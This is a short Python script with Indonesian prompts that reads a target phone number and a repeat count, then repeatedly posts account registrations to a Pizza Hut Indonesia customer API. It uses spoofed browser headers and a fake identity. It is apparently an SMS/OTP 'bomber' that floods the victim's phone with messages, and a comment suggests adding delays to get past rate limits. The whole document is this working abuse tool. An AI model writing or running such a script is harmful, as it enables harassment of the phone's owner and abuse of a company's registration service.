import requests, json
ses=requests.Session()

print("masukan nomer dengan awalan 8**********")
nomer = input("masukan nomer : ")
jumlah = int(input("masukan limit : "))
for z in range(jumlah):
	data = json.dumps({
		"email": "margeng84@gmail.com",
		"first_name": "Gengbeng",
		"last_name": "WokLay",
		"password": "Aldi++\\/67",
		"phone": f"0{nomer}",
		"birthday": "2000-01-02"})
	headers = {
		"Host": "api-prod.pizzahut.co.id",
		"content-length": "157",
		"x-device-type": "PC",
		"sec-ch-ua-mobile": "?1",
		"x-platform": "WEBMOBILE",
		"x-channel": "2",
		"content-type": "application/json;charset=UTF-8",
		"accept": "application/json",
		"x-client-id": "b39773b0-435b-4f41-80e9-163eef20e0ab",
		"x-lang": "en",
		"save-data": "on",
		"x-device-id": "web",
		"origin": "https://www.pizzahut.co.id",
		"sec-fetch-site": "same-site",
		"sec-fetch-mode": "cors",
		"sec-fetch-dest": "empty",
		"referer": "https://www.pizzahut.co.id/",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "id-ID,id;q=0.9,en;q=0.8",
		"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"}
	post = ses.post("https://api-prod.pizzahut.co.id/customer/v1/customer/register",data=data,headers=headers)
	if "errors" not in post.text:
		print("berhasil")
	else:
		print("gagal, mungkin harus kasih delay")
